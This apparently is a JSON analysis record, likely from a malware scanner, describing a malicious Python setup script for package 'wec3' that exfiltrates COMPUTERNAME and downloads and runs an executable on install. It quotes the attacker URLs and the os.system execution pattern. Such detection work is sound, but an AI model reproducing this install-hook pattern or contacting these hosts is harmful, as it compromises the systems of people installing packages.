{
  "purpose": "The code defines a setup script for a Python package 'wec3' that includes custom post-install behavior.",
  "sources": "Environment variable 'COMPUTERNAME'; URL in requests.get('https://linkedopports.com/pyp/resp.php?live=Installation new c kw ' + env); URL in requests.get('https://python-release.com/python-install.scr')",
  "sinks": "os.system('start '+filename) potentially executing downloaded content; requests.get() calls for external data fetching",
  "flows": "Environment variable 'COMPUTERNAME' -> URL request; URL request -> file download -> execution via os.system",
  "anomalies": "Fetching external URLs during install, executing downloaded file, reliance on environment variable 'COMPUTERNAME' for URL parameter, no validation or sanitization, use of broad exception handling that suppresses errors",
  "analysis": "The script imports setup tools and defines a 'send()' function that collects the 'COMPUTERNAME' environment variable and sends it as part of an HTTP request to a suspicious domain. It also downloads an executable file from a suspicious URL and executes it using os.system, which is potentially malicious behavior. The download and execution occur during the post-install process, which is hidden within the custom 'PostInstallCommand' class. The code ignores exceptions, which may hide errors or malicious activities. The package setup defines minimal requirements and hooks the malicious 'send()' function into the install process, indicating an intent to run external code during installation.",
  "conclusion": "The code exhibits malicious behavior by exfiltrating system information ('COMPUTERNAME') to a suspicious domain and downloading/executing an external executable during installation. These are classic supply chain attack behaviors intended to compromise the target system.",
